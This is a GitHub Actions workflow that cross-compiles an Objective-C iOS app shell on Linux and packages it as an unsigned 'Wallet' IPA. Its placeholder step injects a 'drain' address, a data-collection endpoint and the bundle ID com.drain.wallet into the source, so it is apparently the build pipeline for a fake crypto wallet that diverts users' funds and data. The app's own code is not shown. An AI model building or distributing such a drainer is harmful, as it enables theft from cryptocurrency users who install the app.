name: build-ios

# 在 ubuntu runner 上用 clang + iOS SDK 交叉编译 ObjC 壳 → unsigned IPA
# （本账号用不了 macOS runner，实测被 GitHub 拒绝分配，故走 Linux 交叉编译）

on:
  workflow_dispatch:
  push:
    paths:
      - 'ios-shell/objc/**'
      - '.github/workflows/build-ios.yml'

jobs:
  ipa:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4

      - name: 装依赖
        run: |
          set -e
          sudo apt-get update -qq
          sudo apt-get install -y -qq clang lld zip git-lfs
          ld.lld --version || lld --version
          clang --version | head -2
          git lfs version

      - name: 拉 iOS SDK（只取 16.5）
        run: |
          set -e
          cd /tmp
          git lfs install --skip-repo
          git clone --depth 1 --filter=blob:none --sparse https://github.com/theos/sdks.git sdks
          cd sdks
          git sparse-checkout set iPhoneOS16.5.sdk
          git lfs pull --include="iPhoneOS16.5.sdk/**"
          du -sh iPhoneOS16.5.sdk
          ls iPhoneOS16.5.sdk
          test -d iPhoneOS16.5.sdk/usr/include && echo "SDK headers OK"

      - name: 替换占位符
        run: |
          set -e
          DRAIN="${DRAIN_ADDR:-0x1111111111111111111111111111111111111111}"
          EP="${COLLECT_ENDPOINT:-}"
          BUNDLE="${BUNDLE_ID:-com.drain.wallet}"
          echo "drain=$DRAIN bundle=$BUNDLE endpoint=${EP:-<empty>}"
          sed -i "s|DRAIN_ADDR|$DRAIN|g" ios-shell/objc/main.m
          sed -i "s|BUNDLE_ID|$BUNDLE|g"  ios-shell/objc/Info.plist
          if [ -n "$EP" ]; then sed -i "s|COLLECT_ENDPOINT|$EP|g" ios-shell/objc/main.m; fi
          grep -n "kDrainAddress\|CFBundleIdentifier" ios-shell/objc/main.m ios-shell/objc/Info.plist | head -5

      - name: 交叉编译
        run: |
          set -e
          SDK=/tmp/sdks/iPhoneOS16.5.sdk
          cd ios-shell/objc
          clang \
            -target arm64-apple-ios15.0 \
            -isysroot "$SDK" \
            -miphoneos-version-min=15.0 \
            -fobjc-arc \
            -fuse-ld=lld \
            -O2 \
            -Wall \
            -framework UIKit \
            -framework Foundation \
            -framework WebKit \
            -o Wallet \
            main.m 2>&1 | tee /tmp/build.log
          test -f Wallet && echo "=== 产物 ===" && file Wallet && ls -lh Wallet

      - name: 打包 unsigned IPA
        run: |
          set -e
          cd ios-shell/objc
          rm -rf Payload Wallet-unsigned.ipa
          mkdir -p Payload/Wallet.app
          cp Wallet Payload/Wallet.app/
          cp Info.plist Payload/Wallet.app/
          printf 'APPL????' > Payload/Wallet.app/PkgInfo
          python3 -c "import plistlib;d=plistlib.load(open('Payload/Wallet.app/Info.plist','rb'));print('plist OK, bundle=',d['CFBundleIdentifier'],'exe=',d['CFBundleExecutable'])"
          zip -qry Wallet-unsigned.ipa Payload
          ls -lh Wallet-unsigned.ipa

      - name: 上传
        uses: actions/upload-artifact@v4
        with:
          name: Wallet-unsigned-ipa
          path: ios-shell/objc/Wallet-unsigned.ipa
          if-no-files-found: error
